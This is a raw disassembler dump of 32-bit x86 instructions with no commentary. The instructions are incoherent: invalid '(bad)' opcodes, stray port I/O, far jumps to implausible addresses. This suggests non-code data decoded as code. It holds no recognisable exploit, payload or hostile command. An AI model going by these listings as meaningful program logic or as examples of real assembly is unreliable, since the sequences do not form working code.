  440e2b:	test   BYTE PTR [ebp-0xb],cl
  440e2e:	sbb    DWORD PTR [ebp-0x10],ecx
  440e31:	adc    al,0xd9
  440e33:	or     ecx,DWORD PTR [ebx+0x8816928]
  440e39:	out    0xce,al
  440e3b:	fisttp WORD PTR [ecx+0x5582f11d]
  440e41:	sub    DWORD PTR [edx],esi
  440e43:	adc    DWORD PTR [eax+0x61],0xf55f8133
  440e4a:	sbb    ebp,DWORD PTR [edi+0x3c]
  440e4d:	xor    eax,0x4d00285c
  440e52:	sbb    BYTE PTR ds:0xc33a608,bh
  440e58:	mov    esp,ebp
  440e5a:	lock sbb BYTE PTR [edi+0x45],0x18
  440e5f:	outs   dx,DWORD PTR ds:[esi]
  440e60:	cmp    al,0x0
	...
  440e7a:	xchg   esp,eax
  440e7b:	inc    esi
  440e7c:	call   0x405c3c0c
  440e81:	add    al,0x9e
  440e83:	push   edi
  440e84:	or     BYTE PTR [ebx+0x4d82984a],al
  440e8a:	jge    0x440ea6
  440e8c:	dec    ebp
  440e8d:	clc    
  440e8e:	xlat   BYTE PTR fs:[ebx]
  440e90:	sti    
  440e91:	(bad)  
  440e93:	cs std 
  440e95:	dec    ebp
  440e97:	lds    edi,FWORD PTR [edi-0x3c]
  440e9a:	out    0x2,al
  440e9c:	add    bh,bh
  440e9e:	cmp    ch,BYTE PTR [ebp-0x9]
  440ea1:	jmp    0x3da5ce
  440ea6:	push   esi
  440ea7:	fst    QWORD PTR [ebx-0x48]
  440eaa:	int3   
  440eab:	add    al,BYTE PTR [eax]
  440ead:	add    dh,ch
  440eaf:	popa   
  440eb0:	mov    edi,0x8d187
  440eb5:	add    ah,dh
  440eb7:	stos   DWORD PTR es:[edi],eax
  440eb8:	std    
  440eb9:	push   esp
  440ebb:	arpl   sp,sp
  440ebd:	mov    esp,0x417bd47f
  440ec2:	cmp    BYTE PTR [ebx],dl
  440ec4:	stc    
  440ec5:	xchg   DWORD PTR [edi-0x1c],ebp
  440ec8:	mov    ebp,0x6fb6ece7
  440ecd:	(bad)  
  440ece:	jge    0x440eb9
  440ed0:	scas   eax,DWORD PTR es:[edi]
  440ed1:	xor    eax,0x85432e3a
  440ed6:	arpl   WORD PTR [ebx],bp
  440ed8:	daa    
  440ed9:	cld    
  440eda:	hlt    
  440edb:	mov    dh,0x79
  440edd:	mov    edi,0x0
	...
  440ef6:	add    cl,bh
  440ef8:	stos   DWORD PTR es:[edi],eax
  440ef9:	std    
  440efa:	or     BYTE PTR [edx+0x404ba2aa],al
  440f00:	and    esi,DWORD PTR [edx+0x312354cd]
  440f06:	push   esp
  440f07:	mov    dh,0x2a
  440f09:	mov    edx,0x6cc3f708
  440f0e:	jmp    DWORD PTR [ebx]
  440f10:	lods   al,BYTE PTR ds:[esi]
  440f11:	std    
  440f12:	int3   
  440f13:	adc    al,0x23
  440f15:	xor    DWORD PTR [ebp+edi*2-0x7],ecx
  440f19:	stos   DWORD PTR es:[edi],eax
  440f1a:	dec    eax
  440f1b:	xlat   BYTE PTR ds:[ebx]
  440f1c:	push   0x75
  440f1e:	add    al,0x75
  440f20:	and    edi,DWORD PTR [edi+edi*4-0x4e0d5bf3]
  440f27:	mov    ebp,0x2ff43f14
  440f2c:	out    0x28,al
  440f2e:	mov    edi,0x83f0eb78
  440f33:	mov    ah,0xab
  440f35:	std    
  440f36:	call   FWORD PTR [ebx+ebx*8-0x54737d10]
  440f3d:	std    
  440f3e:	jmp    FWORD PTR [edi-0x1d]
  440f41:	ret    0xece7
  440f44:	and    al,0x37
  440f46:	aam    0x3
  440f48:	add    eax,0x4773bd59
  440f4d:	add    esi,edi
  440f4f:	gs int3 
  440f51:	out    0x38,al
  440f53:	nop
  440f54:	mov    esp,DWORD PTR [edi+eax*8+0x3e7034c]
	...
  440f73:	add    ah,dh
  440f75:	mov    cl,0x7
  440f77:	jnp    0x440fa8
  440f79:	mov    eax,ds:0xb138e29f
  440f7e:	(bad)  
  440f7f:	jp     0x440f40
  440f81:	nop
  440f82:	test   al,0x9c
  440f84:	add    al,0x2
  440f86:	test   al,0x7a
  440f88:	sub    al,0x89
  440f8a:	sub    bh,BYTE PTR [eax]
  440f8c:	jno    0x440f8e
  440f8e:	pop    edi
  440f8f:	test   BYTE PTR [ebp-0x488364b9],0x90
  440f96:	test   al,0x9b
  440f98:	in     al,dx
  440f99:	add    eax,0xc439c379
  440f9e:	out    dx,al
  440f9f:	mov    ebp,0xfd8e36a6
  440fa4:	jle    0x44101f
  440fa6:	out    0x3,eax
  440fa8:	hlt    
  440fa9:	add    al,0x66
  440fab:	sub    BYTE PTR [eax],bl
  440fad:	add    al,0xda
  440faf:	jg     0x440fa4
  440fb1:	jmp    esi
  440fb3:	add    edi,ebp
  440fb5:	dec    esi
  440fb6:	in     eax,0x7a
  440fb8:	cs mov cl,0x87
  440fbb:	jp     0x440f6c
  440fbd:	mov    eax,0x47f0386a
  440fc2:	out    0xcb,al
  440fc4:	std    
  440fc5:	pop    edx
  440fc6:	and    al,0x7c
  440fc8:	aaa    
  440fc9:	test   eax,0x8b36de2
  440fce:	pop    ds
  440fcf:	imul   edx,ebx,0xffffff94
  440fd2:	out    0x3,eax
  440fd4:	mov    ecx,0x386ea5
	...
  440ff1:	fmul   DWORD PTR [eax-0x7440d100]
  440ff7:	push   ebx
  440ff8:	xor    edi,ebp
  440ffa:	icebp  
  440ffb:	mov    esp,0xb0fe8f3a
  441000:	lods   al,BYTE PTR ds:[esi]
  441001:	mov    ecx,0xe262c092
  441006:	inc    eax
  441007:	test   ebp,esp
  441009:	js     0x440f97
  44100b:	inc    ebx
  44100c:	std    
  44100d:	mov    bh,0x9d
  44100f:	or     dh,ch
  441011:	adc    ebp,eax
  441013:	std    
  441014:	stos   DWORD PTR es:[edi],eax
  441015:	pop    ebx
  441016:	fcmovb st,st(1)
  441018:	jbe    0x440fe7
  44101a:	std    
  44101b:	mov    cl,0x34
  44101d:	xor    ecx,DWORD PTR [edx-0x55ba2abd]
  441023:	and    eax,0xc47ddfd8
  441028:	repnz test DWORD PTR [eax*4+0x8ac37b1],0xffcbd1ee
  441034:	gs xor al,0xfa
  441037:	(bad)  
  441038:	call   0x9869ba81
  44103d:	scas   eax,DWORD PTR es:[edi]
  44103e:	aas    
  44103f:	in     al,0x72
  441041:	pusha  
  441042:	push   esp
  441043:	out    0xf9,eax
  441045:	sahf   
  441046:	cmp    eax,0x18386540
  44104b:	add    eax,0xfffb09ae
  441050:	call   0xed7abc4c
	...
  44106d:	add    bh,dh
  44106f:	add    al,0xa8
  441071:	leave  
  441072:	and    edi,eax
  441074:	shr    BYTE PTR [esi-0x4c],0xf9
  441078:	(bad)  
  441079:	call   0x573d9e16
  44107e:	cdq    
  44107f:	add    eax,0x4f7e905
  441084:	out    0x0,eax
  441086:	cld    
  441087:	add    al,0x0
  441089:	add    BYTE PTR [ebp+0x48],ah
  44108c:	je     0x44109d
  44108e:	push   esi
  44108f:	aam    0x7
  441091:	(bad)  
  441092:	pop    ebp
  441093:	jmp    DWORD PTR [esi]
  441095:	jbe    0x4410f4
  441097:	pop    es
  441098:	loope  0x4410a2
  44109a:	cdq    
  44109b:	pop    es
  44109c:	add    BYTE PTR [edi],cl
  44109e:	cmp    edx,DWORD PTR [ecx+0x7b]
  4410a1:	loope  0x441055
  4410a3:	push   cs
  4410a4:	inc    edi
  4410a5:	dec    eax
  4410a6:	ficom  DWORD PTR [ecx+0x78d000e]
  4410ac:	add    DWORD PTR [edi+0x55],0x12
  4410b0:	shl    BYTE PTR [edx+ebx*4-0x64],0xe9
  4410b5:	jae    0x4410bb
  4410b7:	sbb    al,0xa4
  4410b9:	and    al,0x4d
  4410bb:	pop    es
  4410bc:	add    BYTE PTR [eax],al
  4410be:	into   
  4410bf:	jmp    0x439:0x133200fb
  4410c6:	pop    ebp
  4410c7:	pop    es
  4410c8:	pop    es
  4410c9:	mov    dh,0x4f
  4410cb:	push   0x59d6fc45
  4410d0:	retf   
  4410d1:	loopne 0x4410d3
	...
  4410eb:	fild   WORD PTR [ebp+0x42a408be]
  4410f1:	clc    
  4410f2:	add    esi,DWORD PTR ds:0xff48709c
  4410f8:	retf   0x4f83
  4410fb:	aad    0x20
  4410fd:	stc    
  4410fe:	call   FWORD PTR ds:0x26e0cb07
  441104:	push   esi
  441105:	dec    eax
  441106:	and    ecx,DWORD PTR [esi+0x6]
  441109:	aas    
  44110a:	inc    eax
  44110b:	mov    gs,WORD PTR [ebp-0x7]
  44110e:	mov    ds,WORD PTR [ecx]
  441110:	std    
  441111:	(bad)  
  441112:	jmp    DWORD PTR [esi-0x27]
  441115:	aas    
  441116:	mov    esp,esi
  441118:	sub    dh,BYTE PTR [ebp-0x43640beb]
  44111e:	add    edx,esp
  441120:	fwait
  441121:	std    
  441122:	jmp    FWORD PTR [edi+0x63]
  441125:	inc    ebp
  441126:	mov    eax,0xfffd9bf5
  44112b:	(bad)  
  44112c:	cmp    al,0x35
  44112e:	sbb    eax,0x85b517b7
  441133:	cmp    ecx,DWORD PTR [eax+edi*2+0x4]
  441137:	ins    BYTE PTR es:[edi],dx
  441138:	daa    
  441139:	mov    ch,0xbf
  44113b:	popf   
  44113c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44113d:	hlt    
  44113e:	mov    cl,0xbd
  441140:	adc    eax,0xe1bff43a
  441145:	sub    al,BYTE PTR [eax+0x64]
  441148:	pop    ds
  441149:	and    bh,ah
  44114b:	hlt    
  44114c:	mov    dl,0x79
  44114e:	iret   
	...
  441167:	add    bh,dh
  441169:	fwait
  44116a:	std    
  44116b:	or     BYTE PTR [edx+0x584b9e9e],ch
  441171:	daa    
  441172:	into   
  441173:	int    0x54
  441175:	daa    
  441176:	dec    ebp
  441177:	pop    eax
  441178:	mov    dh,0x1e
  44117a:	(bad)  
  44117b:	or     bh,dh
  44117d:	arpl   WORD PTR [edi+edi*8+0x3b],bx
  441181:	pushf  
  441182:	std    
  441183:	int3   
  441184:	adc    al,0x27
  441186:	dec    ebp
  441187:	push   eax
  441188:	jge    0x44115b
  44118a:	fwait
  44118b:	dec    eax
  44118c:	xlat   BYTE PTR ds:[ebx]
  44118d:	pop    esi
  44118e:	mov    DWORD PTR [esi*2+0x1dbfcc27],eax
  441195:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441196:	push   cs
  441197:	mov    dl,0x3d
  441199:	adc    eax,0x61bff447
  44119e:	adc    eax,0xd0c4cbf
  4411a3:	and    DWORD PTR [ebx+ebx*4+0x47ffffd],0x2f
  4411ab:	(bad)
  4411ae:	outs   dx,DWORD PTR ds:[esi]
  4411af:	push   ecx
  4411b0:	rol    BYTE PTR [ecx],0x99
  4411b3:	int    0x7b
  4411b5:	aas    
  4411b6:	inc    ebx
  4411b7:	adc    eax,DWORD PTR [esi-0x27af1944]
  4411bd:	jnp    0x441163
  4411bf:	mov    edi,0x3e7037c
  4411c4:	hlt    
  4411c5:	mov    ch,0x47
  4411c7:	(bad)  
  4411c8:	aas    
  4411c9:	test   eax,0xe6af
	...
  4411e2:	add    BYTE PTR [eax],al
  4411e4:	add    BYTE PTR [eax-0x4b],ah
  4411e7:	jg     0xad6cab1c
  4411ed:	in     al,0x5
  4411ef:	sub    BYTE PTR [edi+0x33aa7dbc],cl
  4411f5:	jns    0x4411ff
  4411f7:	outs   dx,DWORD PTR ds:[esi]
  4411f8:	adc    eax,DWORD PTR [esi+0x3f]
  4411fb:	sbb    ecx,DWORD PTR [ebp-0x53d76749]
  441201:	cld    
  441202:	add    DWORD PTR [ecx+0x1ec461c3],ebx
  441208:	retf   0x3ae6
  44120b:	data16 and BYTE PTR [eax+0x4],dl
  44120f:	fiadd  DWORD PTR [edi+0x3e7060b]
  441215:	in     eax,dx
  441216:	pop    edx
  441217:	in     eax,0x8e
  441219:	cs mov ch,0xc7
  44121c:	mov    ?,WORD PTR [edi+0x2850aab0]
  441222:	inc    esi
  441223:	out    0xbb,al
  441225:	in     eax,dx
  441226:	pop    edx
  441227:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441228:	mov    WORD PTR [edi+0x3b59e2a8],?
  44122e:	add    eax,0x910b5b9f
  441233:	out    0x3,eax
  441235:	xor    DWORD PTR [esi+ebp*2+0x851050],esp
  44123c:	scas   eax,DWORD PTR es:[edi]
  44123d:	inc    DWORD PTR [edi-0xdc08ead]
  441243:	mov    esp,0xb0fe8f3a
  441248:	lods   al,BYTE PTR ds:[esi]
	...
  441261:	add    BYTE PTR [ebp+0x2662c092],dh
  441267:	xor    eax,0x8870e585
  44126c:	inc    ebx
  44126d:	cmp    eax,0xee089db8
  441272:	sbb    eax,0x5babfdc5
  441277:	fcmovb st,st(1)
  441279:	mov    dh,0x19
  44127b:	(bad)  
  44127c:	mov    cl,0xb4
  44127e:	mov    ah,0x8a
  441280:	inc    ebx
  441281:	adc    eax,0x1825aa62
  441286:	clc    
  441287:	jge    0x44124d
  441289:	repnz test DWORD PTR [eax*4+0x8a8b831],0xffc81dee
  441295:	gs cmp edi,edx
  441298:	(bad)  
  441299:	call   0xd869bd40
  44129e:	outs   dx,DWORD PTR ds:[esi]
  44129f:	cmp    al,0xe4
  4412a1:	xchg   ecx,eax
  4412a2:	mov    al,0x18
  4412a4:	or     DWORD PTR [edx-0x45],esp
  4412a7:	cld    
  4412a8:	shr    BYTE PTR [ecx],0x48
  4412ab:	fnsave [ecx+0x29]
  4412ae:	clc    
  4412af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4412b0:	pop    eax
  4412b1:	jmp    0x4412aa
  4412b3:	add    al,0x85
  4412b5:	mov    eax,ds:0xa8c05305
  4412ba:	pop    edi
  4412bb:	cmc    
  4412bc:	jl     0x441247
  4412be:	add    eax,0x6f254988
  4412c3:	inc    esi
  4412c4:	dec    eax
  4412c5:	scas   al,BYTE PTR es:[edi]
	...
  4412de:	add    ch,bh
  4412e0:	cmc    
  4412e1:	(bad)  
  4412e2:	call   0x859cde
  4412e7:	lds    eax,FWORD PTR [edi-0x4e328b40]
  4412ed:	jmp    0x75ccd265
  4412f2:	cld    
  4412f3:	(bad)  
  4412f5:	adc    DWORD PTR [eax+0xf0003cf],0xffffff83
  4412fc:	push   es
  4412fd:	test   DWORD PTR [ebp+0x29],0x3dd3c682
  441304:	inc    edi
  441305:	jnp    0x4412cd
  441307:	lds    edi,FWORD PTR [edx+0x4d]
  44130a:	clc    
  44130b:	into   
  44130c:	dec    ebx
  44130d:	xor    esi,DWORD PTR [edi+0x55]
  441310:	stc    
  441311:	aad    0x8b
  441313:	mov    bh,BYTE PTR [ebx]
  441315:	mov    eax,0x38d01
  44131a:	shr    ebp,cl
  44131c:	mov    eax,ds:0xc8be48ea
  441321:	stc    
  441322:	inc    esi
  441323:	push   ecx
  441324:	pop    eax
  441325:	jecxz  0x441328
  441327:	or     bh,BYTE PTR [ebp-0x4372ffed]
  44132d:	call   DWORD PTR [edi]
  44132f:	pop    ebp
  441330:	add    eax,DWORD PTR [eax]
  441332:	sbb    eax,0x73
  441335:	add    BYTE PTR [edi],cl
  441337:	shl    DWORD PTR ds:0x804dfffa,1
  44133d:	inc    ebp
  44133e:	loopne 0x441336
  441340:	aas    
  441341:	lock mov eax,DWORD PTR [eax]
	...
  44135c:	adc    bh,BYTE PTR ds:0x3c03c133
  441362:	and    eax,ecx
  441364:	les    eax,FWORD PTR [esi-0xc]
  441367:	cmp    esp,edx
  441369:	xchg   esp,eax
  44136a:	outs   dx,DWORD PTR ds:[esi]
  44136b:	or     eax,0x1bc0249e
  441370:	or     eax,0x900f0003
  441375:	das    
  441376:	stc    
  441377:	push   esp
  441379:	popf   
  44137a:	mov    WORD PTR [ecx-0x3c],cs
  44137d:	mov    dl,0xbe
  44137f:	jb     0x441374
  441381:	mov    dl,0xbe
  441383:	test   DWORD PTR [ebx+0x1c490459],ebp
  441389:	and    eax,0x641ff442
  44138e:	lods   al,BYTE PTR ds:[esi]
  44138f:	add    eax,0x24d1576f
  441394:	lods   al,BYTE PTR ds:[esi]
  441395:	fwait
  441396:	push   eax
  441397:	xor    BYTE PTR [edi+0x61],bh
  44139a:	xchg   ecx,eax
  44139b:	xchg   DWORD PTR [ecx],edi
  44139d:	fmul   DWORD PTR [ebx+0x4a153449]
  4413a3:	fdiv   st(7),st
  4413a5:	fcom   QWORD PTR [esi]
  4413a7:	adc    edi,DWORD PTR [edi-0x23]
  4413aa:	stos   DWORD PTR es:[edi],eax
  4413ab:	or     bh,BYTE PTR [edi+0x71]
  4413ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4413af:	and    eax,0x404813ac
  4413b4:	ins    DWORD PTR es:[edi],dx
  4413b5:	popa   
  4413b6:	mov    cl,0x87
  4413b8:	cmp    eax,ebx
  4413ba:	test   DWORD PTR [ebx-0x80],eax
  4413bd:	and    ecx,DWORD PTR [edx-0x10]
	...
  4413d8:	add    BYTE PTR [edi+0x6f0316dc],bh
  4413de:	fld    QWORD PTR [ebp-0x3a3c97bd]
  4413e4:	xchg   DWORD PTR [ecx+0x404b858b],edi
  4413ea:	repz retf 
  4413ec:	test   DWORD PTR [ecx-0x4bb6744d],esi
  4413f2:	and    cl,BYTE PTR [edi-0x2c]
  4413f5:	pop    ds
  4413f6:	icebp  
  4413f7:	stos   DWORD PTR es:[edi],eax
  4413f8:	xchg   DWORD PTR [ecx+0x4f08a56f],esi
  4413fe:	fwait
  4413ff:	nop
  441400:	inc    edi
  441401:	hlt    
  441402:	and    cl,BYTE PTR [edi-0x2c]
  441405:	jle    0x4413b7
  441407:	add    al,0x85
  441409:	mov    ecx,0xec8c8f04
  44140e:	inc    esp
  44140f:	call   0x87ac:0x2c7c0851
  441416:	mov    al,ds:0x4b41f66
  44141b:	repnz mov BYTE PTR [ebp-0x4afc18fd],bh
  441422:	add    eax,0x4f403db
  441427:	sbb    al,0xe2
  44142a:	(bad)  
  44142b:	out    0x82,eax
  44142d:	pop    edi
  44142e:	xchg   ebp,eax
  44142f:	out    0xe,eax
  441431:	js     0x4414af
  441433:	call   0xa4be083b
  441438:	stos   DWORD PTR es:[edi],eax
  441439:	jp     0x441478
  44143b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44143c:	mov    eax,DWORD PTR [eax]
	...
  441456:	in     al,dx
  441457:	inc    esp
  441458:	cmp    dl,BYTE PTR [ecx-0x5c]
  44145b:	jnp    0x441409
  44145d:	stos   DWORD PTR es:[edi],eax
  44145e:	mov    ch,0x5
  441460:	rol    DWORD PTR [ebx],cl
  441462:	hlt    
  441463:	add    al,0x10
  441465:	hlt    
  441466:	call   0xe6fd:0xd82e78d
  44146d:	push   cs
  44146e:	jo     0x4414c4
  441470:	out    0x3,eax
  441472:	hlt    
  441473:	add    DWORD PTR [ecx],0x6be708e4
  441479:	sub    BYTE PTR [eax],bl
  44147b:	add    eax,0x4682166
  441480:	fiadd  DWORD PTR [edi+0x3e703b3]
  441486:	in     eax,dx
  441487:	push   esi
  441488:	in     eax,0x9e
  44148a:	mov    edi,0x39cd5e90
  44148f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441490:	and    eax,0x6ffc3683
  441495:	cmp    BYTE PTR [ecx+eax*1],bh
  441498:	lahf   
  441499:	sub    BYTE PTR [esi],0xe4
  44149c:	(bad)  
  44149d:	cmp    ch,BYTE PTR [edx-0x79]
  4414a0:	inc    ebx
  4414a1:	leave  
  4414a2:	push   cs
  4414a3:	inc    edx
  4414a4:	lock jb 0x44146b
  4414a7:	cld    
  4414a8:	(bad)  
  4414a9:	daa    
  4414aa:	or     al,0x8e
  4414ac:	inc    edx
  4414ad:	cmc    
  4414ae:	js     0x4414f1
  4414b0:	loopne 0x441516
  4414b2:	aaa    
  4414b3:	sbb    BYTE PTR [edi],ah
  4414b5:	jb     0x44145b
  4414b7:	pushf  
  4414b8:	test   DWORD PTR [esi],edx
	...
  4414d2:	add    al,dh
  4414d4:	cmp    al,0x25
  4414d6:	mov    eax,ds:0xe9100e76
  4414db:	sub    BYTE PTR [ebx],bh
  4414dd:	je     0x4414cd
  4414df:	(bad)  
  4414e0:	mov    ebx,0xa1f7e902
  4414e5:	add    eax,DWORD PTR [ecx+0x2e]
  4414e8:	out    dx,eax
  4414e9:	(bad)  
  4414ea:	call   0x724c555d
  4414ef:	cld    
  4414f0:	mov    WORD PTR [edi+0x3f83afa6],es
  4414f6:	stc    
  4414f7:	jbe    0x441507
  4414f9:	adc    cl,ch
  4414fb:	outs   dx,BYTE PTR ds:[esi]
  4414fc:	dec    eax
  4414fd:	lock jo 0x44152c
  441500:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441501:	test   DWORD PTR [edx],ebp
  441503:	in     al,dx
  441504:	jmp    0x5aefe2b
  441509:	add    BYTE PTR [edx-0x52],ah
  44150c:	dec    esp
  44150d:	(bad)  
  44150f:	test   BYTE PTR [ebx-0x7b],0x32
  441513:	cmp    BYTE PTR [eax+ecx*1-0x6fa6f98],ah
  44151a:	jmp    0xf2246116
  44151f:	hlt    
  441520:	dec    ebx
  441521:	test   DWORD PTR [edx-0x15e75bc9],esi
  441527:	rol    BYTE PTR ss:[eax-0xf],cl
  44152b:	jmp    0x441525
  44152d:	test   BYTE PTR [eax],al
  44152f:	or     cl,bh
  441531:	mov    esi,0x6f991540
  441536:	inc    eax
	...
  44154f:	add    BYTE PTR ds:0x8633545d,bl
  441555:	mov    dh,0xef
  441557:	(bad)  
  441558:	or     cl,BYTE PTR [ebp-0x7ae20007]
  44155e:	ja     0x441568
  441560:	sbb    eax,0xd8e83f9
  441565:	or     BYTE PTR [eax],al
  441567:	xor    edx,0xffffff90
  44156a:	stc    
  44156b:	push   cs
  44156c:	pop    ecx
  44156d:	jge    0x44156f
  44156f:	add    ch,bl
  441571:	test   dh,dh
  441573:	and    dh,bl
  441575:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441576:	jl     0x4415f5
  441578:	push   ecx
  441579:	add    DWORD PTR [edi],eax
  44157b:	test   BYTE PTR [esi+0x1],al
  44157e:	add    BYTE PTR [eax],al
  441580:	shl    BYTE PTR [ecx],cl
  441582:	cli    
  441583:	(bad)  
  441584:	pusha  
  441585:	imul   eax,DWORD PTR [ebx+0x3a60dece],0xffffff83
  44158c:	(bad)  
  44158e:	adc    BYTE PTR [ebp-0x1b],0x5
  441592:	fadd   DWORD PTR [ebx-0x21945f2d]
  441598:	xchg   esi,eax
  441599:	enter  0x741b,0x49
  44159d:	jl     0x4415e4
  44159f:	or     dl,bl
  4415a1:	inc    edi
  4415a2:	sbb    BYTE PTR [edi],ch
  4415a4:	imul   eax,DWORD PTR [edi+0x0],0xffffffc7
  4415a8:	mov    cl,BYTE PTR [edx+0x7c5dfff9]
  4415ae:	inc    DWORD PTR [edx-0x79f7769b]
	...
  4415cc:	add    BYTE PTR ds:0x95fff759,ch
  4415d2:	imul   esi,edi,0x52c932ff
  4415d8:	pop    edi
  4415d9:	hlt    
  4415da:	mov    es:0xfda5365b,al
  4415e0:	test   BYTE PTR [ecx+0x1c4b8895],dh
  4415e6:	adc    al,0x45
  4415e8:	or     al,0x7f
  4415ea:	loopne 0x44157f
  4415ec:	xchg   DWORD PTR [edi+eiz*1],eax
  4415ef:	xor    bh,ah
  4415f1:	ins    DWORD PTR es:[edi],dx
  4415f2:	aad    0xf3
  4415f4:	xchg   BYTE PTR [ecx+eiz*4-0x2c378e7a],ah
  4415fb:	test   BYTE PTR [ecx-0x44],bl
  4415fe:	(bad)  
  4415ff:	pop    ebx
  441600:	(bad)  
  441601:	sti    
  441602:	pushf  
  441603:	std    
  441604:	pop    eax
  441605:	jg     0x441588
  441607:	cmp    bh,BYTE PTR [esi-0x2b2f6404]
  44160d:	daa    
  44160e:	adc    al,ah
  441610:	add    eax,edi
  441612:	fwait
  441613:	std    
  441614:	(bad)  
  441615:	mov    ebx,0xcbffb561
  44161a:	pushf  
  44161b:	std    
  44161c:	in     al,0xfb
  44161e:	loop   0x441661
  441620:	fdivr  DWORD PTR [ecx+0x7ff99c43]
  441626:	popa   
  441627:	add    eax,0x86443985
  44162c:	dec    eax
  44162d:	lock es dec edx
  441630:	lock add BYTE PTR [eax],al
	...
  441647:	add    BYTE PTR [eax],al
  441649:	add    BYTE PTR [ebp-0x74],ch
  44164c:	mov    BYTE PTR [ebx-0x70],dl
  44164f:	adc    eax,0x4c7d1045
  441654:	add    DWORD PTR [ebp+0x3],edi
  441657:	(bad)  
  441658:	std    
  441659:	xchg   BYTE PTR [ebx],bl
  44165b:	les    eax,FWORD PTR [esi-0x8eecf8f]
  441661:	test   BYTE PTR [ecx+0x447d7fb],bh
  441667:	adc    dl,dl
  441669:	test   bl,dh
  44166b:	add    al,0x66
  44166d:	pushf  
  44166e:	out    dx,eax
  44166f:	pop    es
  441670:	or     DWORD PTR [edi+0x252ef4c],eax
  441676:	rol    DWORD PTR [edi],0xdb
  441679:	inc    edi
  44167b:	in     eax,0x6d
  44167d:	inc    ecx
  44167e:	adc    al,0x7e
  441680:	sbb    al,0xc
  441682:	sbb    al,0xf8
  441684:	ret    0x1d9b
  441687:	and    BYTE PTR [edi-0x153dfff0],0xf9
  44168e:	adc    ecx,DWORD PTR [edx+0x4ca139e7]
  441694:	xchg   ebx,eax
  441695:	fwait
  441696:	std    
  441697:	mov    DWORD PTR [edx],ebp
  441699:	(bad)  
  44169a:	pop    ss
  44169b:	sub    BYTE PTR [ebp-0xb820bf4],ah
  4416a1:	or     esi,DWORD PTR [ecx+0x3f]
  4416a4:	xchg   edi,eax
  4416a5:	out    dx,eax
  4416a6:	xor    eax,0xd4395e01
  4416ab:	ffree  st(0)
  4416ad:	repz add BYTE PTR [eax],al
	...
  4416c4:	add    BYTE PTR [eax],al
  4416c6:	add    dl,dl
  4416c8:	aas    
  4416c9:	out    dx,eax
  4416ca:	add    al,0x2e
  4416cc:	icebp  
  4416cd:	out    0x3a,eax
  4416cf:	loopne 0x441656
  4416d1:	retf   0xf40b
  4416d4:	jnp    0x441682
  4416d6:	mov    bl,0x28
  4416d8:	aam    0x63
  4416da:	mov    edi,0x1b65d820
  4416df:	add    al,0x5
  4416e1:	xchg   esi,eax
  4416e2:	por    mm7,QWORD PTR [ebp-0x47]
  4416e6:	pop    es
  4416e7:	jns    0x44172a
  4416e9:	(bad)  
  4416ea:	out    dx,al
  4416eb:	mov    eax,0xdaabb736
  4416f0:	jmp    esi
  4416f2:	add    edx,DWORD PTR [ecx+0x4a6df9]
  4416f8:	jle    0x44168c
  4416fa:	sti    
  4416fb:	adc    BYTE PTR [esi-0x62d66800],bh
  441701:	pop    es
  441702:	int3   
  441703:	test   DWORD PTR [edi+eax*4],0x4282502e
  44170a:	sbb    DWORD PTR [ebx+0x3],edi
  44170d:	jge    0x4416e0
  44170f:	dec    edx
  441710:	adc    eax,0xfcb4a60c
  441715:	(bad)  
  441716:	call   0xc1c11c12
  44171b:	std    
  44171c:	adc    eax,0xfcb4ae01
  441721:	jmp    edi
  441723:	test   DWORD PTR [eax*4-0x286c0bca],0x2
	...
  441742:	add    BYTE PTR [eax],al
  441744:	cmp    edi,edx
  441746:	int    0x6a
  441748:	pop    eax
  441749:	inc    esp
  44174a:	jge    0x4416dd
  44174c:	jmp    0x83b:0xfaab92fb
  441753:	xor    esi,DWORD PTR [ecx-0x59]
  441756:	sub    cl,0xf7
  441759:	add    al,0xfd
  44175b:	xchg   edi,eax
  44175c:	repnz xor eax,0xb4ec6a3c
  441762:	add    BYTE PTR [eax+0x5],dh
  441765:	fnstenv [edx-0x13]
  441768:	je     0x44171c
  44176a:	je     0x441753
  44176c:	jb     0x44177a
  44176e:	or     al,0xed
  441770:	add    al,0xf0
  441772:	test   BYTE PTR [edi+ebp*2+0x74e6c084],ah
  441779:	data16 cli 
  44177b:	cs jle 0x4417a9
  44177e:	push   ebp
  44177f:	popa   
  441780:	jb     0x441710
  441782:	stc    
  441783:	push   ds
  441784:	into   
  441785:	and    ebx,0xfffdb9b4
  44178b:	popa   
  44178c:	xor    al,0xad
  44178e:	pop    edx
  44178f:	add    BYTE PTR [esi-0x771a7d35],dl
  441795:	ret    0x8
  441798:	and    eax,0x4afff76e
  44179d:	into   
  44179e:	and    ch,0xb8
  4417a1:	mov    esi,0x9c6a0008
  4417a6:	cmp    al,0x0
	...
  4417c0:	add    BYTE PTR [ebx],ch
  4417c2:	xchg   edi,eax
  4417c3:	cmp    al,0x0
  4417c5:	cdq    
  4417c6:	cdq    
  4417c7:	cmp    al,0x0
  4417c9:	sbb    eax,0xe0003ca0
  4417ce:	pushf  
  4417cf:	cmp    al,0x0
  4417d1:	pop    esi
  4417d2:	popf   
  4417d3:	cmp    al,0x0
  4417d5:	jno    0x441777
  4417d7:	cmp    al,0x0
  4417d9:	into   
  4417da:	call   0x3c:0x9b69003c
  4417e1:	mov    WORD PTR [ebp-0x61b4ffc4],ds
  4417e7:	cmp    al,0x0
  4417e9:	loopne 0x44179e
  4417eb:	cmp    al,0x0
  4417ed:	aam    0xb3
  4417ef:	cmp    al,0x0
  4417f1:	test   DWORD PTR [eax-0x4d5fffc4],esi
  4417f7:	cmp    al,0x0
  4417f9:	push   ss
  4417fa:	mov    ah,0x3c
  4417fc:	add    BYTE PTR [edx-0x4c],al
  4417ff:	cmp    al,0x0
  441801:	mov    esi,0x2c003cb1
  441806:	scas   eax,DWORD PTR es:[edi]
  441807:	cmp    al,0x0
  441809:	jae    0x4417c1
  44180b:	cmp    al,0x0
  44180d:	imul   esi,DWORD PTR [esi-0x49e4ffc4],0xb636003c
  441817:	cmp    al,0x0
  441819:	arpl   WORD PTR [edx-0x53f1ffc4],bp
  44181f:	cmp    al,0x0
  441821:	hlt    
